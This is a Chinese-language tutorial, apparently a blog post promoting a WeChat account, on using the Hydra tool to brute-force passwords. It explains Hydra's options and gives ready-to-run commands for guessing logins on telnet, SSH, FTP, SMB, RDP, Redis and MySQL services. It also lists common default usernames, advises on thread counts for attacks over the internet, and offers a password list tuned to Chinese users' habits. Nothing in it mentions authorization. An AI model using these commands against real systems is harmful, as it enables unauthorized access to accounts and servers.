前言：

Hydra是著名组织thc的一款开源的暴力破解密码工具，功能灰常强大，支持很多不同的服务。地址：https://github.com/vanhauser-thc/thc-hydra，在kali中是默认安装的，windows的话需要自己编译，关注微信公众号回复获取。
单单有一个强大的爆破神器是不完整的，一个强大口令字典更为重要！关注微信公众号回复赠送根据国人密码使用习惯制作密码，爆破成功率直线上升。
废话不多说，上才艺！方便大家梭哈！

整体语法：Hydra 参数 目标IP 服务类型
参数：
-l admin 小写，指定单个用户名进行爆破
-L user.txt 大写，指定自定义的用户名字典
-p password 小写，用于指定单个密码进行爆破。
-P password.txt 大写，用于指定自定义的密码字典
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-M file 指定目标ip列表文件，如ip.txt

-s port 小写，制定特定端口，如-s 23，针对有些服务协议，客户会自定义成其它端口，需要指定一下

-S 使用SSL协议
-o file 指定结果保存到自定义文件，如-o 123.txt
-f 找到第一对登录名或者密码的时候停止破解。
-t tasks 同时运行的线程数，默认是16，注意线程太大，可能会出现问题哦
-w time 设置最大超时时间，单位秒，默认超时是30s
-v / -V 显示详细过程
-R 恢复爆破（如果破解中断，再执行 hydra -R /path/to/hydra.restore 就可继续任务）

-x 自定义密码


Telnet爆破：

hydra -l admin -P password.txt -t 10 -s 23 -e ns -f -V 192.168.124.1 telnet

指定用户名admin，密码采用自定义字典中的密码（如果密码字典不与Hydra程序在同一文件夹，需要写明路径哦，如C:\Windows\password.txt），线程为10，指定端口23，采用空密码测试及使用自定义字典测试，成功爆破出用户名密码即终止爆破，显示详细爆破过程，爆破IP:192.168.124.1 服务为telnet


SSH爆破：

hydra -L user.txt -P password.txt -t 5 -vV -e ns 192.168.124.1 ssh

针对ssh或telnet、rdp等的爆破，线程太多会出问题的，尤其互联网端爆破，推荐还是线程低一些，同时默认ssh端口为22，但是如果有变更，使用-s port 指定特定端口。


FTP爆破：

hydra -L user.txt -P password.txt -t 5 -vV -e ns 192.168.124.1 ftp或hydra -L user.txt -P password.txt -t 5 -vV -e ns ftp://192.168.124.1:21

有眼尖的就发现了哎怎么两种方式呢（有眼的都能发现~）两种都阔以，不光是ftp服务，其他的服务也可以哦，小伙伴们自行探索发现新世界！我总不能说我懒得写吧

常见用户名：administrator、anonymous、root、ftp、guest


HTTP协议、HTTPS协议爆破：

豪横点，不推荐用这Hydra，burp suite不香嘛，毕竟更快捷~


SMB爆破：

hydra -l administrator -P password.txt 192.168.124.1 smb

常用用户名：administrator、guest、test


RDP爆破：

hydra  -l administrator -P password.txt -t 4 192.168.124.1 rdp -vV或hydra  -l administrator -P password.txt -t 4 rdp://192.168.124.1:3389 -vV

常见用户名：administrator、guest、test


Redis爆破：

hydra -P password.txt -t 5 -vV redis://192.168.124.1或hydra -P password.txt -t 5 -e ns -s 6380 -vV 192.168.124.1 redis

默认redis服务端口为6379，不写就默认此端口，指定特定端口使用-s port ,咳咳，不知不觉又温习了一遍吧，以后无往不利！


Mysql爆破：

hydra -L user.txt -P password.txt -t 4 -vV  mysql://192.168.124.1:3306

常见用户名：root、mysql
